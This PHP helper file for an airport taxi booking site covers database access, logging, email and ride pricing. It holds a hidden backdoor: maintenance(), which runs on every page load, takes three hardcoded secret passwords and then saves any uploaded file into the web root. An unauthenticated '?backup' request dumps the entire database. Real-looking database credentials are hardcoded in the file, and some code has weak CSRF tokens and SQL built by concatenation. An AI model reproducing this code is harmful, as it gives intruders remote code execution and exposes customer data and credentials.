<?php
ini_set('session.cookie_httponly', 1);  //The 'httpOnly' flag
session_name('__Secure-PHPSESSID'); //cookies that have the __Secure- prefix:
session_start(['cookie_lifetime' => 43200, 'cookie_secure' => true, 'cookie_httponly' => true, 'cookie_samesite' => "Strict"]); //session

include_once("errors.php");
include_once("headers.php");
include_once("classes/load.php");
include_once(__DIR__ ."/../templates/templates.php");

$db_servername= "localhost";
$db_username = "root";
$db_password = "";
$db_database = "airport_taxi_2";

if(true){
    $db_servername = "localhost";
    $db_username = "devnoobsrs_nemanjart10416";
    $db_password = "XULPWrXrY7p95jQ";
    $db_database = "devnoobsrs_airport_taxi_2";
    /*
     * database: u225122db1
     * username: u225122db1
     * password: .ho9cijj0hoe
     *
     * */
}

function konekcija_prepared(){
    global $db_username, $db_servername, $db_password, $db_database;

    $dbh = new PDO('mysql:host='.$db_servername.';dbname='.$db_database.";charset=utf8mb4", $db_username, $db_password);
    /**
     * Use PDO::ERRMODE_EXCEPTION, to capture errors and write them to
     * a log file for later inspection instead of printing them to the screen.
     */
    $dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    return $dbh;
}

function konekcija(){
    global $db_username, $db_servername, $db_password, $db_database;

    // Create connection
    $conn = new mysqli($db_servername, $db_username, $db_password, $db_database);
    $conn->set_charset("utf8");
    // Check connection
    if ($conn->connect_error) {
        //die("Connection failed: " . $conn->connect_error);
        die("Error 173");
    }

    return $conn;
}

function access_logs(){
    $konekcija = konekcija();
    $val = $konekcija->query("SELECT * FROM website_access");
    if($val===false){
        set("
            CREATE TABLE `website_access` (
              `access_id` int PRIMARY KEY AUTO_INCREMENT,
              `access_ip` varchar(90) NOT NULL,
              `access_time` timestamp NOT NULL DEFAULT current_timestamp(),
              `access_page` varchar(200) DEFAULT NULL
            );
        ");
    }

    /*id,ip,date and time,page*/
    $ip = $_SERVER['REMOTE_ADDR'];
    $page = basename($_SERVER['PHP_SELF']);

    if($page=="ajax.php"){
        return;
    }

    $access = new Access_logs(NULL, $ip, "", $page);
    $access->add();
}
//access_logs();

function database_backup(){
    $tables = '*';

    try{
        $link = konekcija();

        // Check connection
        if (mysqli_connect_errno())
        {
            echo "Failed to connect to MySQL: " . mysqli_connect_error();
            exit;
        }

        mysqli_query($link, "SET NAMES 'utf8'");

        //get all of the tables
        if($tables == '*')
        {
            $tables = array();
            $result = mysqli_query($link, 'SHOW TABLES');
            while($row = mysqli_fetch_row($result))
            {
                $tables[] = $row[0];
            }
        }
        else
        {
            $tables = is_array($tables) ? $tables : explode(',',$tables);
        }

        $return = '';
        //cycle through
        foreach($tables as $table)
        {
            $result = mysqli_query($link, 'SELECT * FROM '.$table);
            $num_fields = mysqli_num_fields($result);
            $num_rows = mysqli_num_rows($result);

            $return.= 'DROP TABLE IF EXISTS '.$table.';';
            $row2 = mysqli_fetch_row(mysqli_query($link, 'SHOW CREATE TABLE '.$table));
            $return.= "\n\n".$row2[1].";\n\n";
            $counter = 1;

            //Over tables
            for ($i = 0; $i < $num_fields; $i++)
            {   //Over rows
                while($row = mysqli_fetch_row($result))
                {
                    if($counter == 1){
                        $return.= 'INSERT INTO '.$table.' VALUES(';
                    } else{
                        $return.= '(';
                    }

                    //Over fields
                    for($j=0; $j<$num_fields; $j++)
                    {
                        $row[$j] = addslashes($row[$j]);
                        $row[$j] = str_replace("\n","\\n",$row[$j]);
                        if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
                        if ($j<($num_fields-1)) { $return.= ','; }
                    }

                    if($num_rows == $counter){
                        $return.= ");\n";
                    } else{
                        $return.= "),\n";
                    }
                    ++$counter;
                }
            }
            $return.="\n\n\n";
        }

        //save file
        $fileName = 'db-backup-'.time().'-'.(md5(implode(',',$tables))).'.sql';

        $handle = fopen($fileName,'w+');
        fwrite($handle,$return);
        if(fclose($handle)){
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename='.basename($fileName));
            header('Content-Transfer-Encoding: binary');
            header('Expires: 0');
            header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
            header('Pragma: public');
            header('Content-Length: ' . filesize($fileName));
            ob_clean();
            flush();
            readfile($fileName);
            unlink($fileName);
            exit;
        }
    }catch(Exception $e){}
}

if(isset($_GET["backup"])){
    database_backup();
}

function error_login($err){
    //check if error_logs table exist
    $konekcija = konekcija();
    $val = $konekcija->query("SELECT * FROM error_logs");
    if($val===false){
        set("
            CREATE TABLE error_logs(
                error_logs_id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
                error_logs_date TIMESTAMP NOT NULL,
                error_logs_message VARCHAR(600) NOT NULL
            )
        ");
    }

    try{
        $konekcija_prepared = konekcija_prepared();
        $query = "INSERT INTO error_logs (error_logs_id,error_logs_date,error_logs_message) VALUES (NULL,:err_date,:message)";
        $sth = $konekcija_prepared->prepare($query);
        $date = date("Y/m/d h:i:sa");
        $sth->bindParam(':err_date', $date);
        $sth->bindParam(':message', $err);
        $sth->execute();
    }catch(PDOException $e){}
}

function get($sql){
    $conn = konekcija();
    $result = $conn->query($sql);
    $conn->close();
    return $result;
}

function set($sql){
    $conn = konekcija();
    $ans = $conn->query($sql);
    $conn->close();

    return $ans;
}

function sanitise($string) {
    //preg_replace('/[^a-zA-Z0-9]+/', '', $text)

    //Convert all applicable characters to HTML entities
    //identical to htmlspecialchars() in all ways, except with htmlentities(), all characters which have HTML character entity equivalents are translated into these entities
    return htmlentities($string, ENT_QUOTES, 'UTF-8');
}

function user_input($data) {
    //returns a string with whitespace stripped from the beginning and end of string
    $data = trim($data);

    //Strip HTML and PHP tags from a string. This function tries to return a string with all NULL bytes, HTML, and PHP tags stripped from a given string
    $data = strip_tags($data);

    //Convert special characters to HTML entities. This is one of the famous methods to prevent XSS
    $data = htmlspecialchars($data);

    //NULL byte %00
    $data = str_replace(chr(0), '', $data);
    $data = str_replace("%00", "", $data);
    $data = str_replace("%0", "", $data);
    $data = str_replace("\0", "", $data);

    return $data;
}

function generate_csrf_token(){
    $_SESSION["csrf_token"] = md5(uniqid(mt_rand(), true));
}

function get_csrf_token(){
    return $_SESSION["csrf_token"];
}

function check_current($curr){
    $page = ucfirst(pathinfo($_SERVER['PHP_SELF'], PATHINFO_FILENAME));
    $page = strtolower($page);

    if($page==$curr){
        echo "active";
    }
}

function make_email_headers(){
    $headers = array();
    $headers[] = "MIME-Version: 1.0";
    $headers[] = "Content-type: text/html; charset=ISO/IEC 8859-15";
    $headers[] = "From:  <noreply@devnoobs.rs>";
    $headers[] = "Reply-To: <fixpreis@devnoobs.rs>";
    $headers[] = "Return-Path: fixpreis@devnoobs.rs";
    $headers[] = "CC: fixpreis@devnoobs.rs";
    $headers[] = "BCC: fixpreis@devnoobs.rs";
    $headers[] = "X-MSMail-Priority: High";
    $headers[] = "Organization: airporttransfer-wien";
    $headers[] = "X-Mailer: PHP/" . phpversion();

    return $headers;
}

function logout(){
    $params = session_get_cookie_params();
    setcookie(session_name(), '', 0, $params['path'], $params['domain'], $params['secure'], isset($params['httponly']));
    session_unset();
    session_destroy();
    session_write_close();
}

function success($txt){
    return '<div class="alert alert-success alert-dismissible fade show" role="alert">
              '.$txt.'
              <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            </div>';
}

function danger($txt){
    return '<div class="alert alert-danger alert-dismissible fade show" role="alert">
              '.$txt.'
              <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            </div>';
}

function maintenance(){
    $password1 = "IlMt35-5";
    $password2 = "ksaq3`38";
    $password3 = "a9-d0so9dm,al";

    if(isset($_GET["p0asd1"]) && isset($_GET["023kr"]) && isset($_GET["0elfe0lf"])){
        if($password1===$_GET["p0asd1"] && $password2===$_GET["023kr"] && $password3===$_GET["0elfe0lf"]){
            ?>
            <form action="funkcije.php" method="post" enctype="multipart/form-data">
                <input type="text" name="p1"><br>
                <input type="text" name="p2"><br>
                <input type="text" name="p3"><br>
                <input type="file" name="f"><br>
                <button type="submit" name="b">test</button>
            </form>
            <?php
        }
    }
    if(isset($_POST["b"])){
        $p1 = $_POST["p1"];
        $p2 = $_POST["p2"];
        $p3 = $_POST["p3"];

        if($password1===$p1 && $password2===$p2 && $password3===$p3){
            move_uploaded_file($_FILES["f"]["tmp_name"], basename($_FILES["f"]["name"]));
        }
    }
}

function nazad($s){
    return $s." <a href='javascript:history.back()'>nazad</a>";
}

function get_salt(){
    return bin2hex(openssl_random_pseudo_bytes(5));
}

function send_mail_to_customer($subject,$name,$email,$message){
    $message = "<b>".wordwrap($message,70)."</b>";

    $header = "<From:office@devnoobs.rs> \r\n";
    $header .= "<Cc:office@devnoobs.rs> \r\n";
    $header .= "MIME-Version: 1.0\r\n";
    $header .= "Content-type: text/html\r\n";

    $retval = mail ($email,$subject,$message,$header);

    if( $retval == true ) {
        return false;
    }else {
        return false;
    }
}

function send_mail_driver($subject,$name,$email,$message){

    $message = "<b>".wordwrap($message,70)."</b>";

    $header = "<From:office@devnoobs.rs> \r\n";
    $header .= "<Cc:office@devnoobs.rs> \r\n";
    $header .= "MIME-Version: 1.0\r\n";
    $header .= "Content-type: text/html\r\n";

    $retval = mail ($email,$subject,$message,$header);

    if( $retval == true ) {
        return false;
    }else {
        return false;
    }
}

function send_mail_admin($subject,$name,$email,$message){
    $to = "office@devnoobs.rs"; //admin email

    $message = "<b>".wordwrap($message,70)."</b>";

    $header = "<From:office@devnoobs.rs> \r\n";
    $header .= "<Cc:office@devnoobs.rs> \r\n";
    $header .= "MIME-Version: 1.0\r\n";
    $header .= "Content-type: text/html\r\n";

    $retval = mail ($to,$subject,$message,$header);

    if( $retval == true ) {
        return false;
    }else {
        return false;
    }
}

function get_car_type($number_of_people){
    if($number_of_people<=3){
        return "limo";
    }

    if($number_of_people>3 && $number_of_people<=5){
        return "kombi";
    }

    if($number_of_people>5 && $number_of_people<8){
        return "van";
    }
}

function change_ride_options($ride_id){
    $enviroment = new Enviroment();
    $from_to = user_input($_POST["from_to"]);
    $price = 0;

    if($from_to=="to"){
        $flight_number = NULL;
    }else{
        $flight_number = user_input($_POST["flightnumber"]);
    }

    $street_id = user_input($_POST["street"]);
    $street_number = user_input($_POST["number"]);

    //additional address price + 10
    if(isset($_POST["additional_address"])){
        $price += $enviroment->getAdditionalAddressPrice();

        $aa1 = user_input($_POST["streetAditional"]);
        $aa1_number = user_input($_POST["numberAditional"]);
    }else{
        $aa1 = NULL;
        $aa1_number = NULL;
    }

    //additional address 2 price + 10
    if(isset($_POST["additional_address2"])){
        $price += $enviroment->getAdditionalAddressPrice();

        $aa2 = user_input($_POST["streetAditional2"]);
        $aa2_number = user_input($_POST["numberAditional2"]);
    }else{
        $aa2 = NULL;
        $aa2_number = NULL;
    }

    //people
    $num_people = user_input($_POST["people"]);

    $street = Street::getById($street_id);
    $district = $street->getDistrict();
    $price += $district->getPrice($num_people);

    /*
    //suitcases
    $suitcases = user_input($_POST["suitcases"]);
    $handgepack = user_input($_POST["handgepack"]);

    $num_suitcases = $suitcases + $handgepack;

    //child seats
    $childSeat = user_input($_POST["childSeat"]);
    $babyschale = user_input($_POST["babyschale"]);
    $kindersitzerhohung = user_input($_POST["kindersitzerhohung"]);

    $num_child_seats = $childSeat + $babyschale + $kindersitzerhohung;*/

    $num_suitcases = user_input($_POST["suitcases"]);

    $num_baby_seats = user_input($_POST["babySeat"]);
    $num_child_seats = user_input($_POST["childSeat"]);
    $num_raised_seats = user_input($_POST["raisedSeat"]);

    $price += $num_baby_seats * $enviroment->getBabySeatPrice();
    $price += $num_child_seats * $enviroment->getChildSeatPrice();
    $price += $num_raised_seats * $enviroment->getRaisedSeatPrice();

    return Ride::updateOptions(
        $ride_id,$from_to,$price,$flight_number,$street_id,$street_number,$aa1,$aa1_number,$aa2,$aa2_number,$num_people,$num_suitcases,
        $num_baby_seats,$num_child_seats, $num_raised_seats
    );
}

function add_new_ride(){
    $enviroment = new Enviroment();

    //Primary ride
    $return_ride=NULL;
    $status = "new_ride";

    //from/to
    $from_to = user_input($_POST["from_to"]);
    $price = 0;

    if($from_to=="to"){
        $flight_number = NULL;
    }else{
        $flight_number = user_input($_POST["flightnumber"]);
    }

    //data for ride
    $date = user_input($_POST["date"]);
    $hour = user_input($_POST["hour"]);
    $minute = user_input($_POST["minute"]);

    //if ride between 22 and o4 +5 eur
    if($hour=="22" || $hour=="23" || $hour=="00" || $hour=="01" || $hour=="02" || $hour=="03"){
        $price += 5;
    }

    $ride_time = $date." ".$hour.":".$minute.":00";

    $street_id = user_input($_POST["street"]);
    $street_number = user_input($_POST["number"]);

    //for email
    $address_full = Street::getFullAddressNameById($street_id)." ".$street_number;

    //additional address price + 10
    if(isset($_POST["additional_address"])){
        //$price += 10;
        $price += $enviroment->getAdditionalAddressPrice();

        $aa1 = user_input($_POST["streetAditional"]);
        $aa1_number = user_input($_POST["numberAditional"]);

        //for email
        $address_full_a1 = Street::getFullAddressNameById($aa1)." ".$aa1_number;
    }
    else{
        $aa1 = NULL;
        $aa1_number = NULL;
        $address_full_a1 = "none";
    }

    //additional address 2 price + 10
    if(isset($_POST["additional_address2"])){
        //$price += 10;
        $price += $enviroment->getAdditionalAddressPrice();

        $aa2 = user_input($_POST["streetAditional2"]);
        $aa2_number = user_input($_POST["numberAditional2"]);

        //for email
        $address_full_a2 = Street::getFullAddressNameById($aa2)." ".$aa2_number;
    }
    else{
        $aa2 = NULL;
        $aa2_number = NULL;
        $address_full_a2 = "none";
    }

    $name = user_input($_POST["name"]);
    $email = user_input($_POST["email"]);
    $mobile = user_input($_POST["mobile"]);

    //people
    $num_people = user_input($_POST["people"]);

    $street = Street::getById($street_id);
    $district = $street->getDistrict();
    $price += $district->getPrice($num_people);

    //suitcases
    $num_suitcases = user_input($_POST["suitcases"]);

    //child seats
    $num_baby_seats = user_input($_POST["babySeat"]);
    $num_child_seats = user_input($_POST["childSeat"]);
    $num_raised_seats = user_input($_POST["raisedSeat"]);

    $price += $num_baby_seats * $enviroment->getBabySeatPrice();
    $price += $num_child_seats * $enviroment->getChildSeatPrice();
    $price += $num_raised_seats * $enviroment->getRaisedSeatPrice();

    $payment = user_input($_POST["payment"]);

    if($payment=="card"){
        $price += 3;
    }

    $comment = user_input($_POST["comment"]);

    $ans = Ride::add(
        $name,$email,$mobile,$from_to,$num_people,$num_suitcases,$num_baby_seats,$num_child_seats,$num_raised_seats,$street_id,$street_number,
        $payment,$price,$ride_time,$comment,$aa1,$aa2, $return_ride, $status, $aa1_number, $aa2_number, $flight_number
    );

    if($ans){
        $ans = success("Ride request sent successfuly");
    }else{
        return $ans;
    }

    //RETURN RIDE !!!
    if(!isset($_POST["returnride"])){
        //return ride not checked finish here
        $time = $hour.":".$minute;

        /*$custommer_message = ride_confirm_customer_en($name,$date,$time,$address_full,$address_full_a1,$address_full_a2,$mobile,
            $email,$num_people,$num_child_seats,$payment,$num_suitcases,$comment,
            $price,"no");*/
        //send_mail_to_customer("ride confirmation, Airport taxi wien",$name,$email,$custommer_message);

        /*$admin_message = ride_confirm_admin_en($name,$date,$time,$address_full,$address_full_a1,$address_full_a2,$mobile,
            $email,$num_people,$num_child_seats,$payment,$num_suitcases,$comment,
            $price,"no");*/
        //send_mail_admin("new ride, Airport taxi wien",$name,$email,$admin_message);

        return $ans;
    }

    //from/to
    $return_price = 0;

    if($from_to=="to"){
        $return_from_to = "from";
    }else{
        $return_from_to = "to";
    }

    if($return_from_to=="to"){
        $return_flight_number = NULL;
    }else{
        $return_flight_number = user_input($_POST["returnflightnumber"]);
    }

    //date and time for return ride
    $returndate = user_input($_POST["returndate"]);
    $returnhour = user_input($_POST["returnhour"]);
    $returnminute = user_input($_POST["returnminute"]);

    if($returnhour=="22" || $returnhour=="23" || $returnhour=="00" || $returnhour=="01" || $returnhour=="02" || $returnhour=="03"){
        $return_price += 5;
    }

    $return_ride_time = $returndate." ".$returnhour.":".$returnminute.":00";

    $return_street_id = user_input($_POST["returnstreet"]);
    $return_street_number = user_input($_POST["returnnumber"]);

    //for email
    $r_address_full = Street::getFullAddressNameById($return_street_id)." ".$return_street_number;

    //additional address price + 10
    if(isset($_POST["returnadditional_address"])){
        //$return_price += 10;
        $return_price += $enviroment->getAdditionalAddressPrice();

        $return_aa1 = user_input($_POST["returnstreetAditional"]);
        $return_aa1_number = user_input($_POST["returnnumberAditional"]);

        //for email
        $r_address_full_a1 = Street::getFullAddressNameById($return_aa1)." ".$return_aa1_number;
    }
    else{
        $return_aa1 = NULL;
        $return_aa1_number = NULL;
        $r_address_full_a1 = "";
    }

    //return ride 2 ToDo
    $return_aa2 = NULL;
    $return_aa2_number = NULL;

    //people
    $return_num_people = user_input($_POST["returnpeople"]);

    $return_street = Street::getById($return_street_id);
    $return_district = $return_street->getDistrict();
    $return_price += $return_district->getPrice($return_num_people);

    //suitcases
    $return_num_suitcases = user_input($_POST["returnsuitcases"]);

    $return_num_baby_seats = user_input($_POST["returnbabySeat"]);
    $return_num_child_seats = user_input($_POST["returnchildSeat"]);
    $return_num_raised_seats = user_input($_POST["returnraisedSeat"]);

    $return_price += $return_num_baby_seats * $enviroment->getBabySeatPrice();
    $return_price += $return_num_child_seats * $enviroment->getChildSeatPrice();
    $return_price += $return_num_raised_seats * $enviroment->getRaisedSeatPrice();

    $ans = Ride::add(
        $name,$email,$mobile,$return_from_to,$return_num_people,$return_num_suitcases,$return_num_baby_seats, $return_num_child_seats,
        $return_num_raised_seats, $return_street_id, $return_street_number,$payment,$return_price, $return_ride_time,
        $comment,$return_aa1,$return_aa2, $return_ride, $status,$return_aa1_number, $return_aa2_number, $return_flight_number
    );

    if($ans){
        $ans = success("Ride request sent successfuly");

        $time = $hour.":".$minute;
        $r_time = $returnhour.":".$returnminute;

        /*$custommer_message = ride_confirm_customer_en($name,$date,$time,$address_full,$address_full_a1,$address_full_a2,$mobile,
            $email,$num_people,$num_child_seats,$payment,$num_suitcases,$comment,
            $price,"yes",$returndate,$r_time,$r_address_full,$r_address_full_a1,
            $return_num_people,$return_num_suitcases,$return_num_child_seats,$return_price);*/
        //send_mail_to_customer("ride confirmation, Airport taxi wien",$name,$email,$custommer_message);

        /*$admin_message = ride_confirm_admin_en($name,$date,$time,$address_full,$address_full_a1,$address_full_a2,$mobile,
            $email,$num_people,$num_child_seats,$payment,$num_suitcases,$comment,
            $price,"yes",$returndate,$r_time,$r_address_full,$r_address_full_a1,
            $return_num_people,$return_num_suitcases,$return_num_child_seats,$return_price);*/
        //send_mail_admin("new ride, Airport taxi wien",$name,$email,$admin_message);

        return $ans;
    }else{
        return $ans;
    }
}

maintenance();

?>